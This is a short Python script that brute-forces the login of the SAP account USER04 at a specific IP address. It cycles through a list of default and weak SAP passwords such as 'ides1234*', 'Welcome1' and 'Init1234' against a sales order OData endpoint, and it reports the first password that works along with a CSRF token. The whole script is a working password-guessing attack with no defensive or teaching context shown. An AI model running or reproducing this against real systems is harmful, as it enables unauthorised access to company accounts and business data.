import urllib.request, base64

url = 'http://26.242.44.100:9222/sap/opu/odata/sap/API_SALES_ORDER_SRV/?sap-client=100'

passwords = [
    'ides1234*', 'IDES1234*', 'ides1234', 'IDES1234',
    'Welcome1', 'Welcome2', 'Welcome1909', 'Welcome1809',
    'Init1234', 'Password1', '123456', 'sap', 'manager', 'saps4h',
    'Sap12345', 'Sap123456', 'S4hana1909', 'S4hana1909*'
]

for pwd in passwords:
    req = urllib.request.Request(url)
    auth = base64.b64encode(f'USER04:{pwd}'.encode()).decode()
    req.add_header('Authorization', f'Basic {auth}')
    req.add_header('x-csrf-token', 'fetch')
    try:
        resp = urllib.request.urlopen(req, timeout=3)
        print(f'🎉 FOUND VALID PASSWORD: {pwd} (Status: {resp.status})')
        print('x-csrf-token:', resp.headers.get('x-csrf-token'))
        break
    except urllib.error.HTTPError as e:
        if e.code != 401:
            print(f'HTTP {e.code} for {pwd}')
    except Exception as ex:
        print('Ex:', ex)
else:
    print('None of standard list matched.')
